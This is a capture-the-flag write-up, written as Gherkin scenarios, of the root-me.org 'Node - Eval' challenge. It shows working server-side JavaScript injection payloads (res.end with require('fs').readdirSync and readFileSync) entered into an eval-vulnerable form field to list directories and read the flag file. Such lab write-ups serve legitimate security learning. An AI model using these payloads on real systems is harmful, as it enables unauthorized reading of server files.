## Version 2.0
## language: en

Feature: Node - Eval
  Site:
    root-me.org
  Category:
    Web-Server
  User:
    rocken2k
  Goal:
    Find a way to read the file containing the flag

  Background:
  Hacker's software:
    | <Software name> | <Version>     |
    | Kali Linux      | 5.10.         |
    | Firefox Quantum | 68.2.0esr     |

  Machine information:
    Given I am accessing the website through the URL
    """
    http://challenge01.root-me.org:59039/
    """
    Then I see the homepage with an income calculator [evidence](1.png)

  Scenario: Fail: Fill up the form to find the flag
    Given the form to calculate the income
    When I try to submit the form without filling up any field
    Then a pop-up appears saying that I need to fill up the "income" field
    And I fill up just the "income" field
    Then the form calculates and shows the exact amount that I filled up
    But I can't see the flag
    And I can't solve the challenge

  Scenario: Fail: Try to use the "eval" command to find the flag
    Given the title of the challenge is "eval is evil"
    When I try to pass the following command on the salary field
    """
    eval()
    """
    Then the command and the result appear in the form [evidence](2.png)
    And I discover an "eval vulnerability"
    But I do not find the flag
    And I can't solve the challenge

  Scenario: Success: Reading the file content
    Given that I found an eval vulnerability
    When I search on google how to exploit eval vulnerability in node.js
    Then I find the following payload
    """
    res.end(require('fs').readdirSync('.').toString())
    """
    And I insert the payload on the income field
    And I can see a folder called "S3cr3tEv0d3f0ld3r" [evidence](3.png)
    And I use the following command to see the folder's content
    """
    res.end(require('fs').readdirSync('S3cr3tEv0d3f0ld3r').toString())
    """
    And I see the file "Ev0d3fl4g" that contains the flag [evidence](4.png)
    And I use the following command to see the file's content
    """
    res.end(require('fs').readFileSync('S3cr3tEv0d3f0ld3r/Ev0d3fl4g'))
    """
    And I can see the flag
    And I submit the flag
    And I solve the challenge [evidence](5.png)
